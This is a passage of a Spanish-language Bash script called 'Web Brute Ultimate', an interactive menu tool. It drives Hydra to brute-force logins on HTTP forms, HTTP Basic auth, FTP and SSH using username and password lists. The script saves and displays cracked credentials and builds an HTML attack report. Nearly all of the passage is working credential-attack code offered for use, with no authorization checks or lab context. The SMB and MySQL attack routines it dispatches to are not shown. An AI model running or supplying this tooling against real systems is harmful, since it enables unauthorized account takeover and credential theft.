    echo "Usuarios: $(wc -l < "$user_file") entradas"
    echo "Contraseñas: $(wc -l < "$pass_file") entradas"
    echo "Total intentos: $(($(wc -l < "$user_file") * $(wc -l < "$pass_file")))"
    echo ""
    
    case $target_type in
        "http-form")
            execute_http_form_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        "http-basic")
            execute_http_basic_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        "ftp")
            execute_ftp_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        "ssh")
            execute_ssh_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        "smb")
            execute_smb_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        "mysql")
            execute_mysql_attack "$target_file" "$user_file" "$pass_file" "$result_file"
            ;;
        *)
            echo -e "${RED}❌ Tipo de objetivo no soportado: $target_type${NC}"
            return
            ;;
    esac
    
    # Mostrar resultados
    mostrar_resultados_ataque "$result_file"
}

# Ataque HTTP Form
execute_http_form_attack() {
    local target_file="$1"
    local user_file="$2"
    local pass_file="$3"
    local result_file="$4"
    
    # Leer configuración
    url=$(grep "URL:" "$target_file" | cut -d: -f2-)
    method=$(grep "METHOD:" "$target_file" | cut -d: -f2)
    user_field=$(grep "USER_FIELD:" "$target_file" | cut -d: -f2)
    pass_field=$(grep "PASS_FIELD:" "$target_file" | cut -d: -f2)
    failure_string=$(grep "FAILURE:" "$target_file" | cut -d: -f2)
    
    echo -e "${YELLOW}🌐 Atacando formulario HTTP...${NC}"
    echo "URL: $url"
    echo "Método: $method"
    echo "Campo usuario: $user_field"
    echo "Campo contraseña: $pass_field"
    echo "String de fallo: $failure_string"
    echo ""
    
    if [[ -n "$HYDRA_BIN" ]]; then
        # Construir comando hydra para formulario web
        if [[ "$method" == "GET" ]]; then
            hydra_service="http-get-form"
        else
            hydra_service="http-post-form"
        fi
        
        # Extraer host y ruta
        host=$(echo "$url" | awk -F/ '{print $3}')
        path=$(echo "$url" | awk -F/ '{for(i=4;i<=NF;i++) printf "/%s", $i}')
        
        # Formato: "path:user_field=^USER^&pass_field=^PASS^:failure_string"
        form_data="${path}:${user_field}=^USER^&${pass_field}=^PASS^:${failure_string}"
        
        echo "Ejecutando: hydra -L $user_file -P $pass_file $host $hydra_service \"$form_data\""
        
        $HYDRA_BIN -L "$user_file" -P "$pass_file" \
                   -o "$result_file" \
                   -f \
                   -t 4 \
                   -w 10 \
                   "$host" \
                   "$hydra_service" \
                   "$form_data" \
                   2>&1 | tee -a "$LOG_FILE"
    fi
}

# Ataque HTTP Basic
execute_http_basic_attack() {
    local target_file="$1"
    local user_file="$2"
    local pass_file="$3"
    local result_file="$4"
    
    host=$(grep "HOST:" "$target_file" | cut -d: -f2)
    port=$(grep "PORT:" "$target_file" | cut -d: -f2)
    path=$(grep "PATH:" "$target_file" | cut -d: -f2)
    
    echo -e "${YELLOW}🔐 Atacando HTTP Basic Auth...${NC}"
    echo "Host: $host"
    echo "Puerto: $port"
    echo "Ruta: $path"
    echo ""
    
    if [[ -n "$HYDRA_BIN" ]]; then
        $HYDRA_BIN -L "$user_file" -P "$pass_file" \
                   -o "$result_file" \
                   -f \
                   -t 4 \
                   -s "$port" \
                   "$host" \
                   http-get "$path" \
                   2>&1 | tee -a "$LOG_FILE"
    fi
}

# Ataque FTP
execute_ftp_attack() {
    local target_file="$1"
    local user_file="$2"
    local pass_file="$3"
    local result_file="$4"
    
    host=$(grep "HOST:" "$target_file" | cut -d: -f2)
    port=$(grep "PORT:" "$target_file" | cut -d: -f2)
    
    echo -e "${YELLOW}📁 Atacando FTP...${NC}"
    echo "Host: $host"
    echo "Puerto: $port"
    echo ""
    
    if [[ -n "$HYDRA_BIN" ]]; then
        $HYDRA_BIN -L "$user_file" -P "$pass_file" \
                   -o "$result_file" \
                   -f \
                   -t 4 \
                   -s "$port" \
                   "$host" \
                   ftp \
                   2>&1 | tee -a "$LOG_FILE"
    fi
}

# Ataque SSH
execute_ssh_attack() {
    local target_file="$1"
    local user_file="$2"
    local pass_file="$3"
    local result_file="$4"
    
    host=$(grep "HOST:" "$target_file" | cut -d: -f2)
    port=$(grep "PORT:" "$target_file" | cut -d: -f2)
    
    echo -e "${YELLOW}🔑 Atacando SSH...${NC}"
    echo "Host: $host"
    echo "Puerto: $port"
    echo ""
    
    if [[ -n "$HYDRA_BIN" ]]; then
        $HYDRA_BIN -L "$user_file" -P "$pass_file" \
                   -o "$result_file" \
                   -f \
                   -t 4 \
                   -s "$port" \
                   "$host" \
                   ssh \
                   2>&1 | tee -a "$LOG_FILE"
    fi
}

# Funciones auxiliares para selección
select_target() {
    echo "Objetivos disponibles:"
    
    cd "$WORKDIR/targets"
    target_files=(*.txt)
    
    if [[ ${#target_files[@]} -eq 0 ]] || [[ ! -f "${target_files[0]}" ]]; then
        echo -e "${RED}❌ No hay objetivos disponibles${NC}"
        selected_target=""
        return
    fi
    
    for i in "${!target_files[@]}"; do
        target_type=$(grep "TYPE:" "${target_files[$i]}" | cut -d: -f2 2>/dev/null || echo "unknown")
        host=$(grep "HOST:" "${target_files[$i]}" | cut -d: -f2 2>/dev/null || grep "URL:" "${target_files[$i]}" | cut -d: -f2- | awk -F/ '{print $3}')
        echo "$((i+1))) ${target_files[$i]} ($target_type - $host)"
    done
    
    read -p "Selecciona objetivo [1-${#target_files[@]}]: " selection
    
    if [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le ${#target_files[@]} ]]; then
        index=$((selection-1))
        selected_target="$WORKDIR/targets/${target_files[$index]}"
        echo -e "${GREEN}✅ Seleccionado: ${target_files[$index]}${NC}"
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        selected_target=""
    fi
    
    cd - >/dev/null
}

# Mostrar resultados de ataque
mostrar_resultados_ataque() {
    local result_file="$1"
    
    echo ""
    echo -e "${GREEN}🎉 RESULTADOS DEL ATAQUE${NC}"
    echo "========================="
    
    if [[ -f "$result_file" ]] && [[ -s "$result_file" ]]; then
        echo -e "${CYAN}💎 Credenciales encontradas:${NC}"
        cat "$result_file"
        echo ""
        
        success_count=$(grep -c "login:" "$result_file" 2>/dev/null || echo "0")
        echo -e "${GREEN}✅ Total credenciales crackeadas: $success_count${NC}"
    else
        echo -e "${YELLOW}⚠️ No se encontraron credenciales válidas${NC}"
    fi
    
    echo ""
    echo -e "${CYAN}📊 Archivo de resultados: $result_file${NC}"
}

# Generar reporte final
generar_reporte_final() {
    echo -e "${PURPLE}📊 GENERAR REPORTE FINAL${NC}"
    echo ""
    
    report_file="$WORKDIR/reports/web_brute_report_$(date +%Y%m%d_%H%M%S).html"
    
    echo -e "${YELLOW}📝 Generando reporte HTML...${NC}"
    
    # [El código del reporte HTML sería similar al de hashcat pero adaptado para web brute force]
    # Por brevedad, creo un reporte simple
    
    cat > "$report_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Web Brute Ultimate - Reporte</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: 'Courier New', monospace; background: #1e1e1e; color: #00ff00; margin: 20px; }
        .header { text-align: center; border: 2px solid #00ff00; padding: 20px; margin-bottom: 20px; }
        .section { border: 1px solid #444; padding: 15px; margin: 10px 0; background: #2d2d2d; }
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        .error { color: #ff0000; }
        pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #444; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🌐 WEB BRUTE ULTIMATE</h1>
        <h2>📊 Reporte de Fuerza Bruta Web</h2>
        <p>Generado: $(date)</p>
    </div>

    <div class="section">
        <h3>🎯 OBJETIVOS ATACADOS</h3>
        <pre>$(find "$WORKDIR/targets" -name "*.txt" -exec basename {} \; 2>/dev/null | sort)</pre>
    </div>

    <div class="section">
        <h3>💎 CREDENCIALES ENCONTRADAS</h3>
        <pre>$(find "$WORKDIR/results" -name "*.txt" -exec cat {} \; 2>/dev/null | grep "login:" || echo "No se encontraron credenciales")</pre>
    </div>

    <div class="section">
        <h3>📋 LOG DE ACTIVIDAD</h3>
        <pre>$(tail -50 "$LOG_FILE" 2>/dev/null || echo "Sin log disponible")</pre>
    </div>
</body>
</html>
EOF

    echo -e "${GREEN}✅ Reporte generado: $report_file${NC}"
}

# Menú principal
mostrar_menu() {
    clear
    echo "
██╗    ██╗███████╗██████╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██║    ██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║ █╗ ██║█████╗  ██████╔╝    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║███╗██║██╔══╝  ██╔══██╗    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚███╔███╔╝███████╗██████╔╝    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                                                       
🌐 WEB LOGIN BRUTE - TODAS LAS PLATAFORMAS 🌐
"

    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🎯 MENÚ PRINCIPAL${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo ""
    echo "1) 🎯 Gestionar objetivos"
    echo "2) 👥 Gestionar usuarios"
    echo "3) 🔐 Gestionar contraseñas"
    echo "4) ⚔️ Configurar ataque"
    echo "5) 📊 Generar reporte"
    echo "6) 🔧 Ver configuración"
    echo "7) 🧹 Limpiar archivos temporales"
    echo "8) ❌ Salir"
    echo ""
    echo -e "${YELLOW}Directorio actual: $WORKDIR${NC}"
    echo -e "${GREEN}Ataques completados: $(ls "$WORKDIR/results"/*.txt 2>/dev/null | wc -l)${NC}"
    echo ""
}

# Función principal
main() {
    echo -e "${BLUE}🔧 Inicializando Web Brute Ultimate...${NC}"
    
    verificar_herramientas
    configurar_directorio
    
    while true; do
        mostrar_menu
        read -p "Selecciona opción [1-8]: " opcion
        
        case $opcion in
            1) gestionar_objetivos ;;
            2) gestionar_usuarios ;;
            3) gestionar_passwords ;;
            4) configurar_ataque ;;
            5) generar_reporte_final ;;
            6)
                echo -e "${CYAN}⚙️ CONFIGURACIÓN ACTUAL${NC}"
                echo "Directorio: $WORKDIR"
                echo "Hydra: $HYDRA_BIN"
                echo "Medusa: $MEDUSA_BIN"
                echo "Wfuzz: $WFUZZ_BIN"
                echo "FFuf: $FFUF_BIN"
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                echo -e "${YELLOW}🧹 Limpiando archivos temporales...${NC}"
                find "$WORKDIR" -name "*.tmp" -delete 2>/dev/null || true
                echo -e "${GREEN}✅ Limpieza completada${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                read -p "Presiona Enter para continuar..."
                ;;
        esac
    done
}

# Verificar permisos
if [[ $EUID -eq 0 ]]; then
    echo -e "${YELLOW}⚠️ Ejecutándose como root${NC}"
fi

# Ejecutar función principal
main "$@"